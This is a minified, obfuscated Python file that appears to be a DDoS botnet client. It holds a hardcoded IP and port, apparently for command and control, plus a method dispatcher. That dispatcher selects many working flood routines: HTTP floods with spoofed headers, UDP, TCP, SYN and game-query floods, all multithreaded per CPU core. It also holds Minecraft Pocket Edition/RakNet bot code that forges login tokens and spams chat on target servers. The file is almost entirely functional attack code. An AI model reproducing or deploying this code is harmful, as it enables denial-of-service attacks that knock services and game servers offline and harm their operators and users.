Ao='HANDSHAKING'
An='intervalo'
Am='Standard_Custom'
Al='replace'
Ak=b'\x00\x00'
Aj=isinstance
AQ='register_sent'
AP='entity_id'
AO='split_id'
AN='order_index'
AM='msg_index'
AL='send_seq'
AK=b'\x00'
AJ=bytearray
AC='CONNECTING_1'
AB='mtu_idx'
AA='spawn_fallback'
A9='resource_pack_done'
A8='mensajes'
A7='yaw'
A6='chunk'
A5='text'
A4='move'
A3='nombre'
y='ack_queue'
x='register_cmd'
w='z'
v='y'
u='x'
t='mtu_size'
s='port'
r='host'
q='.'
p=b''
o=Exception
k='use_variant_a'
j='sent_frames'
i=str
f='req2_retry_t'
e='split_map'
d='spawned'
c='client_id'
Z=''
W='mtu_retry_t'
V='proto'
U='pos'
T='utf-8'
S=bytes
R='sock'
Q=print
P='phase'
N=False
L=None
I=int
H='is_closing'
G=len
E=range
D=True
import subprocess as AR,random as C,os as g,time as B,threading as F,socket as A,sys,struct as O,zlib as z,json,base64 as l,math,string as AS,signal,hashlib
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization as AT,hashes
from cryptography.hazmat.backends import default_backend as Ap
AU='45.13.236.245'
AV=26110
AW=5
h={}
a=[]
AD=F.Lock()
J=N
Aq=b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
Ar=b'\xff\xff\xff\xffTSource Engine Query\x00'
As=b'atom data ontop my own ass amp/triphent is my dick and balls'
At=b'UUUU\x00\x00\x00\x01'
Ba=AK*1024
Au=[1024,2048]
def K():
	try:
		A=g.cpu_count()
		if A and A>0:return A*4
	except:pass
	return 8
def Av(ip,port,secs,stop_event):
	b=b'POST';R=b'.';O=stop_event;M=port;J=b'\r\n';S=B.time()+secs;P=0;c=F.Lock();T=M==443;d=[b'GET',b,b'HEAD'];e=[b'/',b'/index.html',b'/api/v1/data',b'/login',b'/dashboard',b'/profile',b'/settings',b'/products',b'/services',b'/about',b'/contact',b'/blog',b'/news',b'/events',b'/gallery',b'/assets/css/style.css',b'/assets/js/main.js',b'/images/logo.png',b'/favicon.ico',b'/robots.txt',b'/sitemap.xml'];f=[b'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',b'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',b'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',b'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',b'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',b'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',b'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',b'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',b'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0',b'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/120.0'];U=[]
	for l in E(300):
		V=C.choice(d);g=C.choice(e);h=C.choice(f);H=p;H+=V+b' '+g+b' HTTP/1.1\r\n';H+=b'Host: '+ip.encode()+J;H+=b'User-Agent: '+h+J;H+=b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n';H+=b'Accept-Language: en-US,en;q=0.5\r\n';H+=b'Accept-Encoding: gzip, deflate, br\r\n';H+=b'Connection: keep-alive\r\n'
		if C.random()<.3:H+=b'Referer: https://google.com/\r\n'
		if C.random()<.2:H+=b'X-Forwarded-For: '+i(C.randint(1,255)).encode()+R+i(C.randint(1,255)).encode()+R+i(C.randint(1,255)).encode()+R+i(C.randint(1,255)).encode()+J
		if V==b:W=b'key='+Z.join(C.choices('abcdefghijklmnopqrstuvwxyz',k=10)).encode();H+=b'Content-Type: application/x-www-form-urlencoded\r\n';H+=b'Content-Length: '+i(G(W)).encode()+J;H+=J+W
		else:H+=J
		U.append(H)
	def X():
		try:
			B=A.socket(A.AF_INET,A.SOCK_STREAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);B.setsockopt(A.IPPROTO_TCP,A.TCP_NODELAY,1);B.setsockopt(A.SOL_SOCKET,A.SO_SNDBUF,65536);B.setsockopt(A.SOL_SOCKET,A.SO_RCVBUF,65536);B.settimeout(2);B.connect((ip,M))
			if T:
				try:import ssl;C=ssl.create_default_context();C.check_hostname=N;C.verify_mode=ssl.CERT_NONE;B=C.wrap_socket(B,server_hostname=ip)
				except:pass
			return B
		except:return
	def j(worker_id):
		nonlocal P;F=0
		try:
			D=[];M=8
			for N in E(M):
				A=X()
				if A:D.append(A)
			if not D:return
			G=0;H=B.time();Q=3000
			while B.time()<S:
				if O.is_set():break
				J=B.time()-H
				if J>.3:
					R=I(Q*J);K=R-G
					if K>0:
						for N in E(min(K,30)):
							if B.time()>=S or O.is_set():break
							T=C.choice(U)
							for A in D[:]:
								try:A.send(T);F+=1
								except:
									try:A.close()
									except:pass
									L=X()
									if L:V=D.index(A);D[V]=L
									else:D.remove(A)
									if not D:return
									continue
					G=0;H=B.time()
				for A in D[:]:
					try:A.recv(4096)
					except:pass
				B.sleep(.0001)
			with c:P+=F
			for A in D:
				try:A.close()
				except:pass
		except:pass
	Y=K();Q(f"[HTTP] Target: {"https"if T else"http"}://{ip}:{M} | Workers: {Y}");a=[]
	for k in E(Y):L=F.Thread(target=j,args=(k,),daemon=D);L.start();a.append(L);B.sleep(.001)
	B.sleep(secs);O.set()
	for L in a:
		try:L.join(timeout=2)
		except:pass
	Q(f"[HTTP] Finalizado - Requests: {P}")
Aw=1400
def Ax(ip,port,secs,stop_event):
	H=stop_event;L=B.time()+secs;N=I(B.time())^g.getpid()
	def O(worker_id):
		F=[]
		for K in E(10):
			try:
				D=A.socket(A.AF_INET,A.SOCK_STREAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);D.settimeout(.1)
				try:D.setsockopt(A.IPPROTO_TCP,A.TCP_NODELAY,1)
				except:pass
				F.append(D)
			except:pass
		if not F:
			try:D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(.1);F.append(D)
			except:pass
		M=ip,port;O=N^worker_id
		while B.time()<L:
			if H.is_set():break
			for D in F[:]:
				try:
					D.connect(M);C.seed(O+I(B.time()*1000)%1000000);P=S([C.randint(0,255)for A in E(Aw)])
					for K in E(50):
						if B.time()>=L or H.is_set():break
						try:
							Q=D.send(P)
							if Q<=0:break
						except(A.error,BrokenPipeError):break
					try:D.close()
					except:pass
					G=A.socket(A.AF_INET,A.SOCK_STREAM);G.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);G.settimeout(.1)
					try:G.setsockopt(A.IPPROTO_TCP,A.TCP_NODELAY,1)
					except:pass
					J=F.index(D);F[J]=G
				except(A.error,A.timeout,ConnectionRefusedError):
					try:D.close()
					except:pass
					try:
						G=A.socket(A.AF_INET,A.SOCK_STREAM);G.settimeout(.1)
						try:G.setsockopt(A.IPPROTO_TCP,A.TCP_NODELAY,1)
						except:pass
						J=F.index(D);F[J]=G
					except:pass
					continue
				except:continue
		for D in F:
			try:D.close()
			except:pass
	J=K();Q(f"[TCP] Target: {ip}:{port} | Workers: {J}");M=[]
	for P in E(J):G=F.Thread(target=O,args=(P,),daemon=D);G.start();M.append(G);B.sleep(.001)
	B.sleep(secs);H.set()
	for G in M:
		try:G.join(timeout=2)
		except:pass
	Q(f"[TCP] Finalizado")
def Ay(ip,port,secs,stop_event):
	G=stop_event;I=B.time()+secs
	def J(worker_id):
		try:
			C=A.socket(A.AF_INET,A.SOCK_DGRAM);C.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);C.connect((ip,port))
			while B.time()<I:
				if G.is_set():break
				for D in E(50):
					try:C.send(p)
					except:pass
			C.close()
		except:pass
	L=K();H=[]
	for M in E(L):C=F.Thread(target=J,args=(M,),daemon=D);C.start();H.append(C)
	B.sleep(secs);G.set()
	for C in H:
		try:C.join(timeout=1)
		except:pass
def AX(ip,port,secs,stop_event):
	H=stop_event;J=B.time()+secs
	def L(worker_id):
		try:
			D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
			while B.time()<J:
				if H.is_set():break
				E=C._urandom(C.choice(Au))
				try:D.sendto(E,(ip,port))
				except:pass
		except:pass
	M=K();I=[]
	for N in E(M):G=F.Thread(target=L,args=(N,),daemon=D);G.start();I.append(G)
	B.sleep(secs);H.set()
	for G in I:
		try:G.join(timeout=1)
		except:pass
def Az(ip,port,secs,stop_event):
	H=stop_event;J=B.time()+secs
	def L(worker_id):
		try:
			D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
			while B.time()<J:
				if H.is_set():break
				F=C._urandom(C.choice([512,1024,2048]))
				for G in E(5):
					try:D.sendto(F,(ip,port))
					except:pass
		except:pass
	M=K();I=[]
	for N in E(M):G=F.Thread(target=L,args=(N,),daemon=D);G.start();I.append(G)
	B.sleep(secs);H.set()
	for G in I:
		try:G.join(timeout=1)
		except:pass
def A_(ip,port,secs,stop_event):
	H=stop_event;J=B.time()+secs
	def L(worker_id):
		try:
			D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
			while B.time()<J:
				if H.is_set():break
				E=C._urandom(65000)
				try:D.sendto(E[:C.randint(1000,65000)],(ip,port))
				except:pass
		except:pass
	M=K();I=[]
	for N in E(M):G=F.Thread(target=L,args=(N,),daemon=D);G.start();I.append(G)
	B.sleep(secs);H.set()
	for G in I:
		try:G.join(timeout=1)
		except:pass
def B0(ip,port,secs,stop_event):
	H=stop_event;J=B.time()+secs
	def L(worker_id):
		try:
			F=[]
			for G in E(10):
				try:D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);F.append(D)
				except:pass
			while B.time()<J:
				if H.is_set():break
				for D in F:
					try:
						for G in E(50):I=C._urandom(1400);D.sendto(I,(ip,port))
					except:pass
			for D in F:
				try:D.close()
				except:pass
		except:pass
	M=K();I=[]
	for N in E(M):G=F.Thread(target=L,args=(N,),daemon=D);G.start();I.append(G)
	B.sleep(secs);H.set()
	for G in I:
		try:G.join(timeout=1)
		except:pass
def B1(ip,port,secs,stop_event):
	H=stop_event;J=B.time()+secs
	def L(worker_id):
		try:
			D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
			while B.time()<J:
				if H.is_set():break
				E=C._urandom(C.choice([512,780,1024,1032]))
				try:D.sendto(E,(ip,port))
				except:pass
		except:pass
	M=K();I=[]
	for N in E(M):G=F.Thread(target=L,args=(N,),daemon=D);G.start();I.append(G)
	B.sleep(secs);H.set()
	for G in I:
		try:G.join(timeout=1)
		except:pass
def B2(ip,port,secs,stop_event):
	G=stop_event;I=B.time()+secs
	def J(worker_id):
		try:
			C=A.socket(A.AF_INET,A.SOCK_DGRAM);C.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);D=b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
			while B.time()<I:
				if G.is_set():break
				try:C.sendto(D,(ip,port))
				except:pass
		except:pass
	L=K();H=[]
	for M in E(L):C=F.Thread(target=J,args=(M,),daemon=D);C.start();H.append(C)
	B.sleep(secs);G.set()
	for C in H:
		try:C.join(timeout=1)
		except:pass
def B3(ip,port,secs,stop_event):
	G=stop_event;I=B.time()+secs
	def J(worker_id):
		try:
			C=A.socket(A.AF_INET,A.SOCK_DGRAM);C.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);D=b'\x01'+AK*23+Ak
			while B.time()<I:
				if G.is_set():break
				try:C.sendto(D,(ip,port))
				except:pass
		except:pass
	L=K();H=[]
	for M in E(L):C=F.Thread(target=J,args=(M,),daemon=D);C.start();H.append(C)
	B.sleep(secs);G.set()
	for C in H:
		try:C.join(timeout=1)
		except:pass
def AY(ip,port,secs,stop_event):
	H=stop_event;J=B.time()+secs
	def L(worker_id):
		while B.time()<J:
			if H.is_set():break
			try:
				D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(3);D.connect((ip,port));F=C._urandom(65000)
				for G in E(10):
					try:D.send(F[:1400])
					except:break
				D.close()
			except:pass
	M=K();I=[]
	for N in E(M):G=F.Thread(target=L,args=(N,),daemon=D);G.start();I.append(G)
	B.sleep(secs);H.set()
	for G in I:
		try:G.join(timeout=1)
		except:pass
def B4(ip,port,secs,stop_event):
	H=stop_event;J=B.time()+secs
	def L(worker_id):
		try:
			D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E=C._urandom(65000)
			while B.time()<J:
				if H.is_set():break
				try:D.sendto(E,(ip,port))
				except:pass
		except:pass
	M=K();I=[]
	for N in E(M):G=F.Thread(target=L,args=(N,),daemon=D);G.start();I.append(G)
	B.sleep(secs);H.set()
	for G in I:
		try:G.join(timeout=1)
		except:pass
def B5(ip,port,secs,stop_event):
	H=stop_event;J=B.time()+secs
	def L(worker_id):
		try:
			D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);F=[AK,b'\x01',b'\xff',b'\x16',b'\x13',b'\x03',b'G',b'P',b'H',b'O',Ak,b'\x01\x00',b'\xff\xff',b'\x80\x00',C._urandom(1),C._urandom(2)]
			while B.time()<J:
				if H.is_set():break
				for I in E(100):
					G=C.choice(F)
					try:D.sendto(G,(ip,port))
					except:pass
				B.sleep(.001)
			D.close()
		except:pass
	M=K();I=[]
	for N in E(M):G=F.Thread(target=L,args=(N,),daemon=D);G.start();I.append(G)
	B.sleep(secs);H.set()
	for G in I:
		try:G.join(timeout=1)
		except:pass
def B6(ip,port,secs,stop_event):
	G=stop_event;I=B.time()+secs
	def J(worker_id):
		try:
			C=A.socket(A.AF_INET,A.SOCK_DGRAM);C.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
			while B.time()<I:
				if G.is_set():break
				try:C.sendto(At,(ip,port))
				except:pass
		except:pass
	L=K();H=[]
	for M in E(L):C=F.Thread(target=J,args=(M,),daemon=D);C.start();H.append(C)
	B.sleep(secs);G.set()
	for C in H:
		try:C.join(timeout=1)
		except:pass
def B7(ip,port,secs,stop_event):
	H=stop_event;J=B.time()+secs
	def L(worker_id):
		try:
			D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E=[b'\xde\xad\xbe\xef\xc0\xff\xee\x00',b'\xba\xad\xf0\r\r\x15\xea^',b'\xfa\xce\xb0\x0c\xca\xfe\xba\xbe',b'\xde\xad\xc0\xde\xf0\r\xba\xbe',b'\x00\x11"3DUfw',b'\x88\x99\xaa\xbb\xcc\xdd\xee\xff',b'\x01#Eg\x89\xab\xcd\xef',b'\xfe\xdc\xba\x98vT2\x10']
			while B.time()<J:
				if H.is_set():break
				F=C.choice(E)*C.randint(10,100)
				try:D.sendto(F,(ip,port))
				except:pass
		except:pass
	M=K();I=[]
	for N in E(M):G=F.Thread(target=L,args=(N,),daemon=D);G.start();I.append(G)
	B.sleep(secs);H.set()
	for G in I:
		try:G.join(timeout=1)
		except:pass
def B8(ip,port,secs,stop_event):
	G=stop_event;I=B.time()+secs
	def J(worker_id):
		while B.time()<I:
			if G.is_set():break
			try:C=A.socket(A.AF_INET,A.SOCK_STREAM);C.settimeout(1);C.connect((ip,port));C.send(g.urandom(1024));C.close()
			except:pass
	L=K()*2;H=[]
	for M in E(L):C=F.Thread(target=J,args=(M,),daemon=D);C.start();H.append(C)
	B.sleep(secs);G.set()
	for C in H:
		try:C.join(timeout=1)
		except:pass
def B9(ip,port,secs,stop_event):
	H=stop_event;J=B.time()+secs
	def L(worker_id):
		while B.time()<J:
			if H.is_set():break
			try:
				if C.choice([D,N]):E=A.socket(A.AF_INET,A.SOCK_STREAM);E.settimeout(2);E.connect((ip,port));E.send(C._urandom(1024));E.close()
				else:E=A.socket(A.AF_INET,A.SOCK_DGRAM);E.sendto(C._urandom(1024),(ip,port))
			except:pass
	M=K();I=[]
	for O in E(M):G=F.Thread(target=L,args=(O,),daemon=D);G.start();I.append(G)
	B.sleep(secs);H.set()
	for G in I:
		try:G.join(timeout=1)
		except:pass
def BA(ip,port,secs,stop_event):
	G=stop_event;I=B.time()+secs
	def J(worker_id):
		try:
			C=A.socket(A.AF_INET,A.SOCK_DGRAM);C.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
			while B.time()<I:
				if G.is_set():break
				try:C.sendto(As,(ip,port))
				except:pass
		except:pass
	L=K();H=[]
	for M in E(L):C=F.Thread(target=J,args=(M,),daemon=D);C.start();H.append(C)
	B.sleep(secs);G.set()
	for C in H:
		try:C.join(timeout=1)
		except:pass
def BB(ip,port,secs,stop_event):
	G=stop_event;I=B.time()+secs
	def J(worker_id):
		try:
			C=A.socket(A.AF_INET,A.SOCK_DGRAM);C.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
			while B.time()<I:
				if G.is_set():break
				try:C.sendto(Aq,(ip,port))
				except:pass
		except:pass
	L=K();H=[]
	for M in E(L):C=F.Thread(target=J,args=(M,),daemon=D);C.start();H.append(C)
	B.sleep(secs);G.set()
	for C in H:
		try:C.join(timeout=1)
		except:pass
def BC(ip,port,secs,stop_event):
	G=stop_event;I=B.time()+secs
	def J(worker_id):
		try:
			C=A.socket(A.AF_INET,A.SOCK_DGRAM);C.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
			while B.time()<I:
				if G.is_set():break
				try:C.sendto(Ar,(ip,port))
				except:pass
		except:pass
	L=K();H=[]
	for M in E(L):C=F.Thread(target=J,args=(M,),daemon=D);C.start();H.append(C)
	B.sleep(secs);G.set()
	for C in H:
		try:C.join(timeout=1)
		except:pass
def BD():
	try:A=AR.check_output(['uname','-m'],stderr=AR.DEVNULL);return A.decode().strip()
	except:return'unknown'
def BE(method,ip,port,secs,stop_event):
	A=method;B={'.HEX':B6,'.STDHEX':B7,'.UDP':AX,'.UDPFRAG':A_,'.UDPGAME':B1,'.UDPPPS':Ay,'.UDPQUERY':B2,'.UDPBYPASS':AX,'.UDPBYPASSV2':Az,'.UDPKILL':B0,'.TCP':Ax,'.TCPOVH':AY,'.MIX':B9,'.SYN':B8,'.VSE':BC,'.MCPE':BA,'.FIVEM':BB,'.RAKNET':B3,'.OVHUDP':B4,'.OVHTCP':AY,'.OVHPPS':B5,'.HTTP':Av}
	if A in B:B[A](ip,port,secs,stop_event)
def BF(method,ip,port,duration,thread_count,username):
	A=username;B=F.Event();C=F.Thread(target=BE,args=(method,ip,port,duration,B),daemon=D);C.start()
	if A not in h:h[A]=[]
	h[A].append((C,B))
def BG(username):
	A=username
	if A in h:
		for(C,B)in h[A]:B.set()
		h[A].clear()
AZ=AS.ascii_lowercase+AS.digits
BH=S([0,255,255,0,254,254,254,254,253,253,253,253,18,52,86,120])
A0=[1492,1464,1400,1200,576]
try:m=ec.generate_private_key(ec.SECP384R1(),Ap())
except o:m=L
def Aa():
	if m is L:return'AAAA'
	return l.b64encode(m.public_key().public_bytes(AT.Encoding.DER,AT.PublicFormat.SubjectPublicKeyInfo)).decode(T)
def Ab(data):
	A=data
	if Aj(A,(dict,list)):A=json.dumps(A,separators=(',',':')).encode(T)
	elif Aj(A,i):A=A.encode(T)
	return l.urlsafe_b64encode(A).rstrip(b'=').decode(T)
def BI(der):B=der;A=2;E=B[A+1];A+=2;C=B[A:A+E];A+=E;K=B[A+1];A+=2;D=B[A:A+K];F=AJ(48);H=AJ(48);I=C[1:]if C[0]==0 else C;J=D[1:]if D[0]==0 else D;F[48-G(I):]=I;H[48-G(J):]=J;return S(F)+S(H)
def Ac(payload):
	B=Aa();A=Ab({'alg':'ES384','x5u':B})+q+Ab(payload)
	if m is L:return A+q
	try:C=m.sign(A.encode(T),ec.ECDSA(hashes.SHA384()));return A+q+l.urlsafe_b64encode(BI(C)).rstrip(b'=').decode(T)
	except o:return A+q
class M:
	def __init__(A):A.parts=[]
	def u8(A,v):A.parts.append(O.pack('B',v&255));return A
	def u16be(A,v):A.parts.append(O.pack('>H',v&65535));return A
	def i32be(A,v):A.parts.append(O.pack('>i',v));return A
	def u32be(A,v):A.parts.append(O.pack('>I',v&4294967295));return A
	def i32le(A,v):A.parts.append(O.pack('<i',v));return A
	def i64be(A,v):A.parts.append(O.pack('>q',v));return A
	def u64be(A,v):A.parts.append(O.pack('>Q',v&0xffffffffffffffff));return A
	def f32be(A,v):A.parts.append(O.pack('>f',v));return A
	def t_le(A,v):A.parts.append(S([v&255,v>>8&255,v>>16&255]));return A
	def raw(A,b):A.parts.append(S(b));return A
	def magic(A):A.parts.append(BH);return A
	def str_(A,s):B=s.encode(T);A.u16be(G(B));A.parts.append(B);return A
	def str_raw(A,b):b=S(b);A.u16be(G(b));A.parts.append(b);return A
	def rak_ip(A,ip,port):
		A.u8(4)
		for B in ip.split(q):A.u8(~I(B)&255)
		A.u16be(port);return A
	def buf(A):return p.join(A.parts)
class b:
	def __init__(A,b):A.b=S(b);A.p=0
	def left(A):return G(A.b)-A.p
	def u8(A):B=A.b[A.p];A.p+=1;return B
	def u16be(A):B=O.unpack_from('>H',A.b,A.p)[0];A.p+=2;return B
	def i32be(A):B=O.unpack_from('>i',A.b,A.p)[0];A.p+=4;return B
	def u32be(A):B=O.unpack_from('>I',A.b,A.p)[0];A.p+=4;return B
	def i64be(A):B=O.unpack_from('>q',A.b,A.p)[0];A.p+=8;return B
	def u64be(A):B=O.unpack_from('>Q',A.b,A.p)[0];A.p+=8;return B
	def f32be(A):B=O.unpack_from('>f',A.b,A.p)[0];A.p+=4;return B
	def t_le(A):B=A.b[A.p]|A.b[A.p+1]<<8|A.b[A.p+2]<<16;A.p+=3;return B
	def bytes_(A,n):B=A.b[A.p:A.p+n];A.p+=n;return B
	def skip(A,n):A.p+=n;return A
	def str_(A):B=A.u16be();return A.bytes_(B).decode(T,errors=Al)
def BJ(base):return f"{base}_{Z.join(C.choices(AZ,k=6))}"
def BK():return Z.join(C.choices(AZ,k=8))
def BL():
	D=AJ(8192)
	def A(x0,y0,x1,y1,r,g,b,a=255):
		for B in E(y0,y1):
			for C in E(x0,x1):A=(B*64+C)*4;D[A]=r;D[A+1]=g;D[A+2]=b;D[A+3]=a
	def F(x,y,r,g,b):A=(y*64+x)*4;D[A]=r;D[A+1]=g;D[A+2]=b;D[A+3]=255
	B=198,134,66;H=92,56,35;C=67,95,175;G=53,85,105;I=38,38,38;A(8,0,16,8,*H);A(16,0,24,8,*B);A(0,8,8,16,*B);A(8,8,16,16,*B);A(16,8,24,16,*H);A(24,8,32,16,*H);A(8,0,16,4,*H);A(9,9,11,11,255,255,255);F(9,10,33,18,7);A(13,9,15,11,255,255,255);F(14,10,33,18,7);F(11,11,*B);F(12,11,*B);F(11,12,140,80,30);F(12,12,140,80,30);A(10,13,14,14,140,60,20);A(20,16,28,20,*C);A(28,16,36,20,*C);A(16,20,20,32,*C);A(20,20,28,32,*C);A(28,20,32,32,*C);A(32,20,40,32,*C);A(23,20,25,32,50,75,155);A(44,16,48,20,*B);A(48,16,52,20,*B);A(40,20,44,32,*B);A(44,20,48,32,*B);A(48,20,52,32,*B);A(52,20,56,32,*B);A(44,20,48,24,*C);A(40,20,44,24,*C);A(48,20,52,24,*C);A(52,20,56,24,*C);A(4,16,8,20,*G);A(8,16,12,20,*G);A(0,20,4,32,*G);A(4,20,8,32,*G);A(8,20,12,32,*G);A(12,20,16,32,*G);A(0,28,4,32,*I);A(4,28,8,32,*I);A(8,28,12,32,*I);A(12,28,16,32,*I);return l.b64encode(S(D)).decode(T)
Ad=BL()
def BM(bot):A=bot;H=Aa();J='00000000-0000-4000-8000-'+g.urandom(6).hex();C=I(B.time());K=Ac({'extraData':{'displayName':A[A3],'identity':J,'XUID':Z},'identityPublicKey':H,'nbf':C-60,'exp':C+86400});L=Ac({'ClientRandomId':A[c]&4294967295,'ServerAddress':f"{A[r]}:{A[s]}",'SkinData':Ad,'SkinId':Am,'CapeData':Z,'SkinGeometryName':'geometry.humanoid.custom','SkinGeometry':Z,'DeviceOS':1,'GameVersion':'0.15.10'});D=json.dumps({'chain':[K]}).encode(T);E=L.encode(T);N=M().i32le(G(D)).raw(D).i32le(G(E)).raw(E).buf();F=z.compress(N,level=7);return S([254,1])+M().i32be(84).i32be(G(F)).raw(F).buf()
def BN(bot):A=bot;B=l.b64decode(Ad);return M().u8(143).str_(A[A3]).i32be(70).i32be(70).u64be(A[c]).raw(g.urandom(16)).str_(f"{A[r]}:{A[s]}").str_(Z).str_(Am).str_raw(B).u8(0).buf()
def BO(pkts,bot):
	B=p.join(O.pack('>I',G(A))+A for A in pkts);A=z.compress(B,level=7)
	if bot[V]>=84:return S([254,6])+M().i32be(G(A)).raw(A).buf()
	return M().u8(146).i32be(G(A)).raw(A).buf()
BP=1024
def Y(bot,buf):
	A=bot
	if A[R]is L:return
	try:A[R].sendto(buf,(A[r],A[s]))
	except:pass
def n(bot,payload,is_split,split_count,split_id,split_idx):
	D=is_split;C=payload;A=bot
	if A[R]is L or A[H]or J:return
	E=A[AL];A[AL]+=1;B=M().u8(132).t_le(E);B.u8(112 if D else 96);B.u16be(G(C)*8);I=A[AM];A[AM]+=1;K=A[AN];A[AN]+=1;B.t_le(I).t_le(K).u8(0)
	if D:B.u32be(split_count).u16be(split_id).u32be(split_idx)
	B.raw(C);F=B.buf();A[j][E]=F
	if G(A[j])>BP:del A[j][next(iter(A[j]))]
	Y(A,F)
def Ae(bot,payload):
	B=payload;A=bot
	if A[R]is L or A[H]or J:return
	C=(A[t]or 1464)-60
	if G(B)<=C:n(A,B,N,0,0,0);return
	K=A[AO]&65535;A[AO]+=1;I=math.ceil(G(B)/C)
	for F in E(I):n(A,B[F*C:(F+1)*C],D,I,K,F)
def X(bot,pkt):
	A=bot
	if A[R]is L or A[H]or J:return
	Ae(A,BO([pkt],A))
def AE(bot):
	if bot[V]<84:return{A4:157,A5:147,A6:201}
	if bot[k]:return{A4:16,A5:7,A6:61}
	return{A4:19,A5:9,A6:69}
def A1(bot):return M().u8(AE(bot)[A6]).i32be(8).buf()
def BQ(bot):B=bot;A=B[U];return M().u8(AE(B)[A4]).i64be(B[AP]).f32be(A[u]).f32be(A[v]).f32be(A[w]).f32be(A[A7]).f32be(A[A7]).f32be(A['pitch']).u8(0).u8(1).buf()
def Af(bot,msg):return M().u8(AE(bot)[A5]).u8(1).str_(bot[A3]).str_(msg).buf()
def Ag(bot,status):A=8 if bot[k]else 8;return M().u8(A).u8(status).u16be(0).buf()
def Ah(bot,status):
	A=bot
	if status==3 and not A[d]:A[d]=D;X(A,A1(A));BR(A);BT(A);BS(A)
def BR(bot):
	A=bot
	if A[AQ]or not A[x]:return
	A[AQ]=D
	if A[x].startswith('/'):B=f"{A[x]} {BK()}"
	else:B=A[x]
	X(A,Af(A,B))
def BS(bot):
	A=bot
	def C():
		C=0
		while not A[H]and not J and A[d]:
			if A[A8]:D=A[A8][C%G(A[A8])];X(A,Af(A,D));C+=1
			B.sleep(A[An])
	F.Thread(target=C,daemon=D).start()
def BT(bot):
	A=bot
	def E():
		D,E,F=A[U][u],A[U][v],A[U][w]
		while not A[H]and not J and A[d]:A[U][u]=D+C.uniform(-5,5);A[U][w]=F+C.uniform(-5,5);A[U][v]=E+C.uniform(-.5,.5);A[U][A7]=C.uniform(0,360);X(A,BQ(A));B.sleep(.5)
	F.Thread(target=E,daemon=D).start()
def A2(bot,data):
	G=data;A=bot
	if not G or A[H]:return
	C=G[0];B=b(G);B.skip(1)
	if C==144 or C==2:
		E=B.i32be()
		if E==0:X(A,A1(A))
		elif E in(1,2):AH(A)
		elif E==3:Ah(A,E)
		return
	if C==6 and A[V]>=84 and not A[A9]and not A[k]:X(A,Ag(A,3));return
	if C==7 and A[V]>=84 and not A[A9]and not A[k]:A[A9]=D;X(A,Ag(A,4));return
	if C==3 and A[V]>=84:X(A,M().u8(4).buf());X(A,A1(A));return
	if C in(149,9,11,17):
		if A[V]>=84:A[k]=C==9
		try:B.i32be();B.u8();B.i32be();B.i32be();A[AP]=B.i64be();B.i32be();B.i32be();B.i32be();A[U][u]=B.f32be();A[U][v]=B.f32be();A[U][w]=B.f32be()
		except:pass
		X(A,A1(A))
		if A[AA]is L:
			def K():
				if not A[d]and not A[H]and not J:Ah(A,3)
			I=F.Timer(1e1,K);I.daemon=D;I.start();A[AA]=I
		return
	if C in(145,5):AH(A);return
def AF(bot,payload):
	C=bot
	if C[H]:return
	try:
		D=b(payload);J=D.i32be();F=D.bytes_(min(J,D.left()))
		try:I=z.decompress(F)
		except:I=z.decompress(F,-15)
		A=b(I)
		while A.left()>=4:
			E=A.u32be()
			if E==0 or E>A.left():break
			B=A.bytes_(E)
			if B[0]==254 and G(B)>1:A2(C,B[1:])
			else:A2(C,B)
	except:pass
def Ai(bot,payload):
	C=bot;A=payload
	if not A or C[H]:return
	D=A[0]
	if D==0:
		if G(A)>=9:E=O.unpack_from('>q',A,1)[0];n(C,M().u8(3).i64be(E).i64be(I(B.time()*1000)).buf(),N,0,0,0)
		return
	if D==21:AH(C);return
